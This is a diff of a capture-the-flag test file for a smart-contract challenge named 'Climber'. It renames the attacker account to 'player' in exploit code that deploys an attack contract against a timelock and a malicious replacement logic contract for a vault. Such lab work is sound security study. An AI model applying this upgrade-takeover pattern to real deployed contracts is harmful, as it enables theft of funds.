@@ -92,21 +92,21 @@ describe('[Challenge] Climber', function () {
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
 
-        // Connect to existing contracts as attacker
-        const attackVault = this.vault.connect(attacker);
-        const attackTimeLock = this.timelock.connect(attacker);
-        const attackToken = this.token.connect(attacker);
+        // Connect to existing contracts as player
+        const attackVault = vault.connect(player);
+        const attackTimeLock = timelock.connect(player);
+        const attackToken = token.connect(player);
 
         // Deploy our attacking contract
-        const AttackContractFactory = await ethers.getContractFactory("AttackTimelock", attacker);
+        const AttackContractFactory = await ethers.getContractFactory("AttackTimelock", player);
         const attackContract = await AttackContractFactory.deploy(
             attackVault.address,
             attackTimeLock.address,
             attackToken.address,
-            attacker.address);
+            player.address);
 
         // Deploy contract that will act as new logic contract for vault
-        const MalciousVaultFactory = await ethers.getContractFactory("AttackVault", attacker);
+        const MalciousVaultFactory = await ethers.getContractFactory("AttackVault", player);
         const maliciousVaultContract = await MalciousVaultFactory.deploy();
 
         const PROPOSER_ROLE = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE"));
